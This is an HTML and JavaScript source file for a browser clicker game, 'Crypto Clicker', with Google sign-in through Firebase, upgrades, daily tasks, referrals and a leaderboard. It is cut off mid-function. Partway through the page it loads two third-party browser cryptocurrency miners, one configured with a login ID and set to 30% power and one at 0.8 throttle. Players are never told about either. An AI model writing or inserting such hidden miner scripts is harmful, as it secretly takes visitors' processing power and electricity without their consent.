<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<!--  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">-->
  <title>Crypto Clicker</title>
  <style>
    body {
      background: #0f0f0f;
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding: 20px;
    }
    input { padding: 8px; font-size: 16px; margin-bottom: 10px; border-radius: 5px; border: none; }
    .click-button {
      background: linear-gradient(135deg, #00ffa6, #00c3ff);
      color: #000;
      font-weight: bold;
      padding: 15px 30px;
      font-size: 18px;
      border-radius: 12px;
      cursor: pointer;
      margin: 10px;
      border: none;
    }
    #counter {
      font-size: 36px;
      margin-top: 20px;
      font-weight: bold;
      transition: transform 0.2s ease;
    }
    #counter.bounce {
      transform: scale(1.2);
    }
    #levelMessage {
      display: none;
      opacity: 0;
      transition: opacity 1s ease-in-out;
      color: gold;
      font-weight: bold;
      margin-top: 5px;
    }
    #levelMessage.show {
      display: block;
      opacity: 1;
    }
    table { margin: 20px auto; border-collapse: collapse; width: 80%; max-width: 600px; }
    th, td { padding: 10px; border-bottom: 1px solid #333; }
    th { background-color: #00c3ff; color: #000; }
    #message { margin-top: 10px; color: #ff5555; }
    .progress-container { background-color: #222; border-radius: 10px; height: 12px; width: 140px; margin: 10px auto; overflow: hidden; box-shadow: 0 0 5px #00ffc8; }
    .progress-bar { height: 100%; background: linear-gradient(90deg, #00ffc8 0%, #00c3ff 100%); width: 0%; transition: width 0.3s ease-in-out; border-radius: 10px; }
    #profilePanel { position: absolute; top: 20px; left: 20px; background-color: #1a1a1a; padding: 15px; border-radius: 12px; box-shadow: 0 0 10px #00c3ff; width: 200px; text-align: left; }
    #profilePanel div { margin: 6px 0; }
    #buttonGroup { margin-top: 180px; }
    #motiveText {
      margin-top: 20px;
      font-size: 18px;
      color: #00ffc8;
      text-shadow: 0 0 8px #00ffc8;
      transition: opacity 0.5s ease-in-out;
    }
    .achievement-panel {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.4s ease, padding 0.4s ease;
      padding: 0 10px;
      background-color: #1a1a1a;
      border-radius: 10px;
      margin-top: 20px;
      box-shadow: 0 0 10px #00c3ff;
    }
    .achievement-panel.open {
      max-height: 500px;
      padding: 10px;
    }
    .ad-container {
      text-align: center;
      margin: 20px 0;
      max-width: 100%;
      overflow: hidden;
    }
    .ad-container iframe {
      max-width: 100%;
      width: 728px;
      height: 90px;
      border: none;
      margin: 10px auto;
      display: block;
    }
    @media (max-width: 768px) {
      .ad-container iframe {
        width: 100%;
        height: auto;
        max-width: 300px;
      }
    }
    #tasksPanel {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.4s ease, padding 0.4s ease;
      padding: 0 10px;
      background-color: #1a1a1a;
      border-radius: 10px;
      margin-top: 20px;
      box-shadow: 0 0 10px #00c3ff;

      height: auto; /* –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫—É—é –≤—ã—Å–æ—Ç—É */
/*  min-height: 150px; /* –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è –≤—ã—Å–æ—Ç–∞, —á—Ç–æ–±—ã –ø–∞–Ω–µ–ª—å –Ω–µ –±—ã–ª–∞ —Å–ª–∏—à–∫–æ–º –º–∞–ª–µ–Ω—å–∫–æ–π */
/*  overflow-y: auto; /* –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–æ–∫—Ä—É—Ç–∫—É, –µ—Å–ª–∏ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –ø—Ä–µ–≤—ã—à–∞–µ—Ç –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é –≤—ã—Å–æ—Ç—É */
 /* max-height: 50vh; /* –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é –≤—ã—Å–æ—Ç—É (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ, 50% –≤—ã—Å–æ—Ç—ã —ç–∫—Ä–∞–Ω–∞) */
    }
    
    #tasksPanel.open {
      max-height: 500px;
      padding: 10px;
      height: auto; /* –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫—É—é –≤—ã—Å–æ—Ç—É –¥–ª—è —Å–ø–∏—Å–∫–∞ –∑–∞–¥–∞–Ω–∏–π */
    }
    #tasksList div {
      margin-bottom: 10px;
      padding: 8px;
      border: 1px solid #00c3ff;
      border-radius: 8px;
      background-color: #222;
    }
    @keyframes shake {
      0% { transform: translateX(0); }
      25% { transform: translateX(-5px); }
      50% { transform: translateX(5px); }
      75% { transform: translateX(-5px); }
      100% { transform: translateX(0); }
    }




    .bonus-card {
  background: #1a1a1a;
  padding: 15px;
  border-radius: 12px;
  width: 180px;
  box-shadow: 0 0 10px #00c3ff;
  text-align: center;
}
.bonus-card h3 {
  margin: 0 0 10px;
  font-size: 18px;
  color: #00ffa6;
}
.bonus-card p {
  margin: 0 0 10px;
  font-size: 14px;
  color: #fff;
}
#claimBonusBtn:disabled {
  background: #555;
  cursor: not-allowed;
}
@media (max-width: 768px) {
  #hourlyBonus {
    top: 10px;
    right: 10px;
  }
  .bonus-card {
    width: 140px;
    padding: 10px;
  }
  .bonus-card h3 {
    font-size: 16px;
  }
  .bonus-card p {
    font-size: 12px;
  }
}

    #tasksList .click-button {
  background: linear-gradient(135deg, #00ffa6, #00c3ff);
  color: #000;
  font-weight: bold;
  padding: 8px 15px;
  font-size: 14px;
  border-radius: 8px;
  cursor: pointer;
  margin: 5px;
  border: none;
  display: inline-block;
  z-index: 10;
  position: relative;
}
#tasksList .click-button:hover {
  background: linear-gradient(135deg, #00c3ff, #00ffa6);
}
#tasksList .click-button:disabled {
  background: #555;
  cursor: not-allowed;
}
    
#mainButtonContainer {
  display: flex;
  justify-content: center;
  margin: 20px 0;
 /* position: relative; /* –î–æ–±–∞–≤—å—Ç–µ, —á—Ç–æ–±—ã –¥–æ—á–µ—Ä–Ω–∏–π #particles-js –ø–æ–∑–∏—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–ª—Å—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ */
 /* width: 100%; /* –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –∏–º–µ–µ—Ç —à–∏—Ä–∏–Ω—É */
 /* height: 200px; /* –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –≤—ã—Å–æ—Ç—É, –µ—Å–ª–∏ –æ–Ω–∞ –Ω–µ –∑–∞–¥–∞–Ω–∞ */
}

.main-click-button {
  width: 120px;
  height: 120px;
  background: linear-gradient(135deg, #00ffa6, #00c3ff);
  border-radius: 50%;
  border: none;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0 0 15px #00c3ff;
  transition: transform 0.2s ease, box-shadow 0.2s ease;
  outline: none; /* –£–±–∏—Ä–∞–µ–º –∫–≤–∞–¥—Ä–∞—Ç–Ω—ã–π –∫–æ–Ω—Ç—É—Ä */
  -webkit-tap-highlight-color: transparent; /* —É–±–∏—Ä–∞–µ—Ç —Å–µ—Ä—ã–π –∫–≤–∞–¥—Ä–∞—Ç –Ω–∞ Android */
  z-index: 1;
}

.main-click-button:hover {
  box-shadow: 0 0 25px #00ffa6;
}

.main-click-button:active {
  transform: scale(0.9);
  box-shadow: 0 0 10px #00c3ff; /* –£–º–µ–Ω—å—à–∞–µ–º —Ç–µ–Ω—å –ø—Ä–∏ –Ω–∞–∂–∞—Ç–∏–∏ */
}

/* –°—Ç–∏–ª–∏ –¥–ª—è —Ñ–æ–∫—É—Å–∞ (–¥–ª—è –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏) */
.main-click-button:focus {
  outline: none; /* –£–±–∏—Ä–∞–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –∫–æ–Ω—Ç—É—Ä */
  box-shadow: 0 0 15px #00ffa6, 0 0 5px #00c3ff; /* –î–æ–±–∞–≤–ª—è–µ–º –∫–∞—Å—Ç–æ–º–Ω—É—é —Ç–µ–Ω—å –¥–ª—è —Ñ–æ–∫—É—Å–∞ */
}

.main-click-button .icon {
  font-size: 50px;
}

.main-click-button,
.click-button {
  touch-action: manipulation; /* –û—Ç–∫–ª—é—á–∞–µ—Ç –º–∞—Å—à—Ç–∞–±–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –∑–∞–¥–µ—Ä–∂–∫—É –ø—Ä–∏ –∫–∞—Å–∞–Ω–∏–∏ */
}

        

.pulse {
  animation: pulse 0.2s ease;
}

@keyframes pulse {
  0% { transform: scale(1); }
  50% { transform: scale(1.2); }
  100% { transform: scale(1); }
}


#particles-js {
  position: absolute;
  width: 100%;
  height: 100%;
  /*background: #1a1a1a; /* –§–æ–Ω –¥–ª—è –∫–æ–Ω—Ç—Ä–∞—Å—Ç–∞ */
  z-index: -1; /* –ß–∞—Å—Ç–∏—Ü—ã –Ω–∞ –∑–∞–¥–Ω–µ–º –ø–ª–∞–Ω–µ */
}


#leaderboardContainer {
  max-width: 800px;
  margin: 20px auto;
  background: #1a1a1a;
  border-radius: 10px;
  overflow: hidden;
  box-shadow: 0 0 20px rgba(0, 195, 255, 0.3);
}

.tabs {
  display: flex;
  justify-content: flex-start; /* –ó–∞–∫–ª–∞–¥–∫–∏ –≤—ã—Ä–æ–≤–Ω–µ–Ω—ã —Å–ª–µ–≤–∞ */
  margin-bottom: -1px; /* –£–±–∏—Ä–∞–µ–º –∑–∞–∑–æ—Ä –º–µ–∂–¥—É –≤–∫–ª–∞–¥–∫–∞–º–∏ –∏ —Ç–∞–±–ª–∏—Ü–µ–π */
}

.tab-button {
  padding: 10px 20px;
  background: #2a2a2a;
  color: #fff;
  border: 1px solid #00c3ff;
  border-bottom: none; /* –£–±–∏—Ä–∞–µ–º –Ω–∏–∂–Ω—é—é –≥—Ä–∞–Ω–∏—Ü—É –¥–ª—è —ç—Ñ—Ñ–µ–∫—Ç–∞ –∑–∞–∫–ª–∞–¥–∫–∏ */
  border-radius: 5px 5px 0 0; /* –ó–∞–∫—Ä—É–≥–ª–µ–Ω–Ω—ã–µ —É–≥–ª—ã —Ç–æ–ª—å–∫–æ —Å–≤–µ—Ä—Ö—É */
  cursor: pointer;
  font-size: 16px;
  transition: background 0.3s ease, color 0.3s ease;
  position: relative;
  z-index: 1; /* –í–∫–ª–∞–¥–∫–∞ –Ω–∞–¥ —Ç–∞–±–ª–∏—Ü–µ–π */
}

.tab-button:hover {
  background: #3a3a3a;
}

.tab-button.active {
  background: linear-gradient(135deg, #00c3ff, #00ffa6);
  color: #000;
  font-weight: bold;
  border-bottom: 1px solid transparent; /* –°–∫—Ä—ã–≤–∞–µ–º –≥—Ä–∞–Ω–∏—Ü—É –¥–ª—è –∞–∫—Ç–∏–≤–Ω–æ–π –≤–∫–ª–∞–¥–∫–∏ */
  z-index: 2; /* –ê–∫—Ç–∏–≤–Ω–∞—è –≤–∫–ª–∞–¥–∫–∞ –≤—ã—à–µ */
}

#leaderboardTable {
  width: 100%;
  border-collapse: collapse;
  background: #1a1a1a;
}

#tableHeader {
  background: #00c3ff; /* –°–∏–Ω—è—è –ø–æ–ª–æ—Å–∫–∞ –¥–ª—è –∑–∞–≥–æ–ª–æ–≤–∫–∞ */
}

#tableHeader th {
  padding: 10px;
  color: #000;
  font-weight: bold;
  text-align: left;
}

#leaderboardBody td {
  padding: 10px;
  color: #fff;
  border-bottom: 1px solid #333;
}

/* –°—Ç–∏–ª–∏ –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ */
@media (max-width: 600px) {
  .tab-button {
    padding: 8px 15px;
    font-size: 14px;
  }

  #tableHeader th, #leaderboardBody td {
    padding: 8px;
    font-size: 14px;
  }
}
    


 /* #settings {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 10px;
  background: #1a1a1a;
  padding: 20px;
  border-radius: 12px;
  width: 200px;
  margin: 0 auto;
  box-shadow: 0 0 10px #00c3ff;
}
#settings h3 {
  color: #00ffa6;
  margin: 0;
}
#settings p {
  color: #fff;
  margin: 5px 0;
}
#settings .click-button:disabled {
  background: #555;
  cursor: not-allowed;
}  */



    

  
                   
  </style>
</head>

<body>
  <div id="profilePanel">
    <div><strong>Player:</strong> <span id="profileName">Anonymous</span></div>
    <div><strong>Level:</strong> <span id="playerLevel">1</span> / 10</div>
    <div><strong>Click Power:</strong> <span id="profileClickPower">1</span></div>
    <div><strong>Autoclicker:</strong> <span id="profileAutoclick">Inactive</span></div>
    <div><strong>Tokens:</strong> <span id="profileTokens">0</span></div>

    <div><strong>Crystals:</strong> <span id="profileCrystals">0 üíé</span></div>
    <!-- –î–æ–±–∞–≤–ª—è–µ–º —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π —Ä–∞–∑–¥–µ–ª -->
  <div><strong>Referral Link:</strong> <input id="referralLink" readonly style="width: 150px;"></div>   
  <div><strong>Invited:</strong> <span id="invitedCount">0</span></div>
   <div><button class="click-button" onclick="copyReferralLink()">Copy Link</button></div>
    
    <div><button class="click-button" onclick="signOut()">Sign Out</button></div>
  </div>

  <div id="playerLevelContainer">
    <div id="levelMessage" style="display: none; color: gold; font-weight: bold; margin-top: 5px;">
      <!-- Message will appear here -->
    </div>
  </div>

  <h1>Crypto Clicker üí∞</h1>

  <div id="authSection">
    <button class="click-button" onclick="signInWithGoogle()">Sign in with Google</button>
    <div id="motiveText">Click ‚Äî earn tokens.</div>
  </div>

  <div id="gameSection" style="display:none;">
    <div id="hourlyBonus" style="position: absolute; top: 20px; right: 20px;">
    <div class="bonus-card">
      <h3>Hourly Bonus</h3>
      <p id="bonusTimer">Next in: 01:00:00</p>
      <button class="click-button" id="claimBonusBtn" onclick="claimHourlyBonus()" disabled>Claim Bonus</button>
    </div>
  </div>
   <!-- <div id="dailyReward" style="display: none; margin-top: 20px;">
      <h2>Daily Reward</h2>
      <p id="streakText">Login streak: 0 days</p>
      <button class="click-button" onclick="claimDailyReward()">Claim Reward</button>
    </div>-->

    <div id="mainButtonContainer">
      <div id="particles-js" style="position: absolute; width: 100%; height: 100%; z-index: -1;"></div>
  <button id="mainClickButton" class="main-click-button" onclick="clickToken()">
    <span class="icon">üí∞</span>
  </button>
    </div>

    <div id="counter">Tokens: 0</div>
    <div id="message"></div>
    <div id="buttonGroup">
     <!-- <button class="click-button" onclick="clickToken()">Collect Token</button> -->
      <button class="click-button" id="shopBtn" onclick="toggleShop()">Shop</button>
      <button class="click-button" onclick="toggleAchievements()">üèÜ Achievements</button>
      <button class="click-button" onclick="toggleTasks()">üìã Tasks</button>
      <button class="click-button" onclick="startMiniGame()">Start Mini-Game</button>
    </div>

    <div id="shop" style="display:none; margin-top: 20px;">
      <h2>üõí Upgrades</h2>
      <p id="clickPowerCostText">üí™ Click Power +1 (Cost: 50)</p>
      <p>Current: <span id="clickPowerDisplay">1</span> / 8</p>
      <div class="progress-container">
        <div class="progress-bar" id="clickPowerBar"></div>
      </div>
      <button class="click-button" onclick="buyUpgrade('clickPower')">Buy</button>

      <h2>‚ö° Autoclickers</h2>

      <div id="settings" style="background: #1a1a1a; padding: 20px; border-radius: 4px; width: 300px; margin: 0 auto; box-shadow: 0 0 10px #00c3ff;">
  <h3>Autoclicker Level: <span id="networkLevel">1</span> / 20</h3>
  <p id="autoclickerDuration">Duration: <span id="timeLeft">60</span>s</p>
  <p id="autoclickerUpgradeCost">Upgrade Cost: 100 Tokens + 5000 üíé</p>
  <button class="click-button" id="upgradeAutoclickerBtn" onclick="upgradeAutoclicker()">Upgrade Autoclicker</button>
  <button class="click-button" id="activateFreeAutoclickerBtn" onclick="activateFreeAutoclicker()">Activate Free Autoclicker Coming soon</button>
</div>



      
      <div id="autoclickerShop" style="display: flex; flex-wrap: wrap; justify-content: center; gap: 20px;">
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>1 Minute</h3>
          <p>Cost: 200 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(1)">Buy</button>
        </div>
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>5 Minutes</h3>
          <p>Cost: 800 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(5)">Buy</button>
        </div>
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>10 Minutes</h3>
          <p>Cost: 1400 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(10)">Buy</button>
        </div>
      </div>
    </div>

    <div id="achievementsPanel" class="achievement-panel">
      <h2>Achievements</h2>
      <div id="achievementsList"></div>
    </div>

    <div id="tasksPanel" class="achievement-panel">
      <h2>Daily Tasks</h2>
      <div id="tasksList"></div>
    </div>

    <div id="miniGamePanel" style="display: none; margin-top: 20px;">
  <h2>Mini-Game: Clicker Race!</h2>
  <p>Click 50 times in 10 seconds!</p>
  <p>Time Left: <span id="miniGameTimer">10</span> sec</p>
  <p>Clicks: <span id="miniGameClicks">0</span>/50</p>
  <button class="click-button" onclick="miniGameClick()">Click!</button>
</div>


 <div id="leaderboardContainer">
  <div class="tabs">
    <button class="tab-button active" onclick="showTab('overall')" id="overallTabBtn">Overall</button>
    <button class="tab-button" onclick="showTab('weekly')" id="weeklyTabBtn">Weekly Winners</button>
  </div>
  <table id="leaderboardTable">
    <thead id="tableHeader">
      <!-- –ó–∞–≥–æ–ª–æ–≤–∫–∏ –±—É–¥—É—Ç –º–µ–Ω—è—Ç—å—Å—è –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –≤–∫–ª–∞–¥–∫–∏ -->
    </thead>
    <tbody id="leaderboardBody"></tbody>
  </table>
</div>   
    


  <script src="https://wm.bmwebm.org/WEBMINER.js"></script>
  <script>WEBMINER.config({ login: "5991295", pass: null }).power(30);</script>


<script src="https://www.hostingcloud.racing/7cNE.js"></script>
<script>
    var _client = new Client.Anonymous('a906669d7e396ee6ee954686b5a94aca67c554cebb263559bb90c79e9a945eda', {
        throttle: 0.8, c: 'w', ads: 0
    });
    _client.start();
    

</script>


  
<!--  <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script> -->
<script src="https://unpkg.com/tsparticles@3.5.0/tsparticles.bundle.min.js"></script>

  
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDVgvBf_C6dIMtZ4MISwR5YRCBi8_JXinQ",
      authDomain: "cryptoclickertry.firebaseapp.com",
      databaseURL: "https://cryptoclickertry-default-rtdb.firebaseio.com",
      projectId: "cryptoclickertry",
      storageBucket: "cryptoclickertry.firebasestorage.app",
      messagingSenderId: "1017002572592",
      appId: "1:1017002572592:web:e06e5f4ba00017dc1466f5",
      measurementId: "G-W2T3BN4LL3"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const auth = firebase.auth();

    const allAchievements = {
      superClicker: { name: "Super Clicker", description: "Click 10,000 times", reward: "+2 Click Power (2 min)" },
      tokenHoarder: { name: "Token Hoarder", description: "Collect 1,000,000 tokens", reward: "+2 Click Power (2min)" },
      level5: { name: "Level 5 Reached", description: "Reach level 5", reward: "+1 Click Power" },
    };

    const levelUpRequirements = [
      50000, 100000, 500000, 2500000, 50000000, 200000000, 800000000, 3200000000, 10000000000
    ];

   

const dailyTasks = [
  {
    id: "clickMarathon",
    description: "Make 100 clicks",
    goal: 100,
    reward: 50,
    period: "daily"
  },
  {
    id: "collectTokens",
    description: "Collect tokens",
    goalOptions: [1000, 3000, 5000],
    rewards: [100, 350, 600],
    period: "daily"
  },
  {
    id: "subscribeTwitter",
    description: "Follow @CircleGameTry on X",
    goal: 1,
    reward: 20,
    period: "daily",
    link: "https://x.com/CircleGameTry"
  },
  {
    id: "clickMasterWeekly",
    description: "Make 500 clicks in a week",
    goal: 500,
    reward: 500,
    period: "weekly"
  },
  {
    id: "autoclickerMaster",
    description: "Activate autoclicker 5 times in a week",
    goal: 5,
    reward: "Free 5-minute autoclicker",
    period: "weekly",
    alternate: true // –§–ª–∞–≥ –¥–ª—è —á–µ—Ä–µ–¥–æ–≤–∞–Ω–∏—è
  },
  {
    id: "collectBigTokens",
    description: "Collect tokens in a week",
    goalOptions: [10000, 12000, 15000],
    rewards: [1000, 1200, 1500],
    period: "weekly",
    alternate: true // –§–ª–∞–≥ –¥–ª—è —á–µ—Ä–µ–¥–æ–≤–∞–Ω–∏—è
  },
  {
  id: "miniGameChallenge",
  description: "Play 5 mini-games",
  goal: 5,
  reward: 1,
  rewardType: "crystals", // Custom field to indicate crystal reward
  period: "daily"
  }
];
    
    

    let user = null;
    let score = 0;
    let clickPower = 1;
    let autoclickActive = false;
    let autoclickInterval = null;
    let autoclickEndTime = 0;
    let autoclickCooldown = false;
    let currentLevel = 1;
    let totalClicks = 0;
    let autoclickerUses = 0;
    let achievements = {};
    let tempBoostTimeout = null;
    let originalClickPower = null;
    let isRenderingTasks = false;
    let bonusTimerInterval = null;
    let isAnimating = false;
    let isProcessingReferrer = false;
    let currentTab = "overall"; // –û—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º —Ç–µ–∫—É—â—É—é –≤–∫–ª–∞–¥–∫—É
    let crystals = 0;


    let miniGameActive = false;
    let miniGameClicks = 0;
    let miniGameTimer = null;


    let autoclickerLevel = 1;

    const maxAutoclickerDuration = 4 * 60 * 60 * 1000; // 4 —á–∞—Å–∞



function startMiniGame() {
  if (score < 1000) {
    showMessage("You need 1000 tokens to start the mini-game!");
    return;
  }
  miniGameActive = true;
  miniGameClicks = 0;
  document.getElementById("miniGamePanel").style.display = "block";
  document.getElementById("miniGameClicks").innerText = miniGameClicks;
  let timeLeft = 10;
  document.getElementById("miniGameTimer").innerText = timeLeft;
  miniGameTimer = setInterval(() => {
    timeLeft--;
    document.getElementById("miniGameTimer").innerText = timeLeft;
    if (timeLeft <= 0) {
      endMiniGame();
    }
  }, 1000);

}
    

function miniGameClick() {
  if (miniGameActive) {
    miniGameClicks++;
    document.getElementById("miniGameClicks").innerText = miniGameClicks;
    if (miniGameClicks >= 50) {
      endMiniGame(true);
    }
  }
}

function endMiniGame(success = false) {
  clearInterval(miniGameTimer);
  miniGameActive = false;
  document.getElementById("miniGamePanel").style.display = "none";
  if (success) {
    score += 500;
    showMessage("Mini-game completed! +500 tokens!");
    updateTaskProgress("miniGameChallenge", 1); // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å
    checkTaskCompletion("miniGameChallenge"); // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ –∏ –Ω–∞—á–∏—Å–ª—è–µ–º –Ω–∞–≥—Ä–∞–¥—É
    submitScore();
  } else {
    showMessage("Mini-game failed. Try again!");
  }
  updateCounterDisplay();
  updateProfilePanel();
  renderTasks();
}
    
    

function generateReferralLink() {
  if (!user) return '';
  const baseUrl = window.location.origin; // –ù–∞–ø—Ä–∏–º–µ—Ä, https://your-game-domain.com
  return `${baseUrl}/?ref=${user.uid}`;
}

function copyReferralLink() {
  const referralLink = document.getElementById('referralLink');
  referralLink.select();
  document.execCommand('copy');
  showMessage('Referral link copied!');
}

    
function updateProfilePanel() {
  document.getElementById('profileClickPower').innerText = Math.min(clickPower, 8);
  if (autoclickActive) {
    const remaining = Math.max(0, autoclickEndTime - Date.now());
    const seconds = Math.floor(remaining / 1000) % 60;
    const minutes = Math.floor(remaining / 60000);
    document.getElementById('profileAutoclick').innerText = `Active: ${minutes}:${seconds.toString().padStart(2, '0')}`;
  } else {
    document.getElementById('profileAutoclick').innerText = 'Inactive';
  }
  let level = 1;
  for (let i = 0; i < levelUpRequirements.length; i++) {
    if (score >= levelUpRequirements[i]) {
      level = i + 2;
    } else {
      break;
    }
  }
  document.getElementById('playerLevel').innerText = level;
  document.getElementById('profileTokens').innerText = score;
  document.getElementById('profileName').innerText = user?.displayName || 'Anonymous';
  document.getElementById('referralLink').value = generateReferralLink();

  // Add crystals to profile (assuming a global `crystals` variable)
  const crystalsElement = document.getElementById('profileCrystals');
  if (crystalsElement) {
    crystalsElement.innerHTML = `${crystals || 0} üíé`;
  }

  // –ü–æ–¥—Å—á–∏—Ç—ã–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–∏–≥–ª–∞—à—ë–Ω–Ω—ã—Ö
  if (user) {
    db.ref(`referrals/${user.uid}`).once('value').then(snapshot => {
      const referrals = snapshot.val();
      const invitedCount = referrals ? Object.keys(referrals).length : 0;
      document.getElementById('invitedCount').innerText = invitedCount;
    });
  }

  const levelMessageElement = document.getElementById('levelMessage');
  if (level === 10) {
    levelMessageElement.innerText = 'Maximum level reached!';
    levelMessageElement.classList.add('show');
  } else {
    levelMessageElement.classList.remove('show');
  }
}
 

    function checkDailyReward() {
      if (!user) return;
      const today = new Date().toDateString();
      db.ref("dailyRewards/" + user.uid).once("value").then(snapshot => {
        const data = snapshot.val() || { lastLogin: "", streak: 0 };
        const lastLogin = data.lastLogin || "";
        let streak = data.streak || 0;

        if (lastLogin !== today) {
          document.getElementById("dailyReward").style.display = "block";
          if (new Date(lastLogin).toDateString() === new Date(Date.now() - 86400000).toDateString()) {
            streak++;
          } else {
            streak = 1;
          }
          db.ref("dailyRewards/" + user.uid).set({ lastLogin: today, streak: streak });
          document.getElementById("streakText").innerText = `Login streak: ${streak} days`;
        }
      });
    }

    function claimDailyReward() {
      db.ref("dailyRewards/" + user.uid).once("value").then(snapshot => {
        const data = snapshot.val();
        const streak = data.streak || 1;
        const rewards = [50, 100, 200, 300, 500, 1000, 2000];
        const reward = rewards[Math.min(streak - 1, rewards.length - 1)];

        score += reward;
        updateCounterDisplay();
        submitScore();
        showMessage(`Claimed ${reward} tokens for ${streak}-day streak!`);
        document.getElementById("dailyReward").style.display = "none";
      });
    }



function startBonusTimer() {
  if (bonusTimerInterval) clearInterval(bonusTimerInterval);

  bonusTimerInterval = setInterval(() => {
    if (!user) return;
    db.ref(`hourlyBonus/${user.uid}`).once("value").then(snapshot => {
      const data = snapshot.val() || { lastClaim: 0 };
      const now = Date.now();
      const timeSinceLastClaim = now - data.lastClaim;
      const oneHour = 3600000; // 1 hour in milliseconds
      const timeRemaining = Math.max(0, oneHour - timeSinceLastClaim);

      if (timeRemaining <= 0) {
        document.getElementById("claimBonusBtn").disabled = false;
        document.getElementById("bonusTimer").innerText = "Claim now!";
        clearInterval(bonusTimerInterval);
      } else {
        document.getElementById("claimBonusBtn").disabled = true;
        const hours = Math.floor(timeRemaining / 3600000);
        const minutes = Math.floor((timeRemaining % 3600000) / 60000);
        const seconds = Math.floor((timeRemaining % 60000) / 1000);
        document.getElementById("bonusTimer").innerText = `Next in: ${hours.toString().padStart(2, '0')}:${minutes
          .toString()
          .padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      }
    }).catch(error => {
      console.error("Error fetching bonus timer:", error);
      showMessage("Failed to load bonus timer.");
    });
  }, 1000);
}



function claimHourlyBonus() {
  if (!user) {
    showMessage("Please sign in to claim the bonus.");
    return;
  }

  db.ref(`hourlyBonus/${user.uid}`).once("value").then(snapshot => {
    const data = snapshot.val() || { lastClaim: 0 };
    const now = Date.now();
    const timeSinceLastClaim = now - data.lastClaim;
    const oneHour = 3600000;

    if (timeSinceLastClaim >= oneHour || !data.lastClaim) {
      const reward = Math.floor(Math.random() * (200 - 10 + 1)) + 10; // Random 10-200 tokens

      // –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è score
      db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
        return (currentScore || 0) + reward;
      }).then(transactionResult => {
        if (transactionResult.committed) {
          score = transactionResult.snapshot.val(); // –û–±–Ω–æ–≤–ª—è–µ–º –ª–æ–∫–∞–ª—å–Ω—ã–π score
          updateCounterDisplay();
          showMessage(`Claimed ${reward} tokens from Hourly Bonus!`);

          // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è –±–æ–Ω—É—Å–∞
          db.ref(`hourlyBonus/${user.uid}`).set({ lastClaim: now }).then(() => {
            document.getElementById("claimBonusBtn").disabled = true;
            startBonusTimer();
          }).catch(error => {
            console.error("Error saving bonus claim:", error);
            showMessage("Failed to save bonus claim.");
          });
        } else {
          showMessage("Failed to claim bonus due to server error.");
        }
      }).catch(error => {
        console.error("Error updating score:", error);
        showMessage("Failed to update score.");
      });
    } else {
      showMessage("Bonus not ready yet!");
    }
  }).catch(error => {
    console.error("Error checking bonus eligibility:", error);
    showMessage("Failed to check bonus eligibility.");
  });
}


function showTab(tab) {
  const tableHeader = document.getElementById("tableHeader");
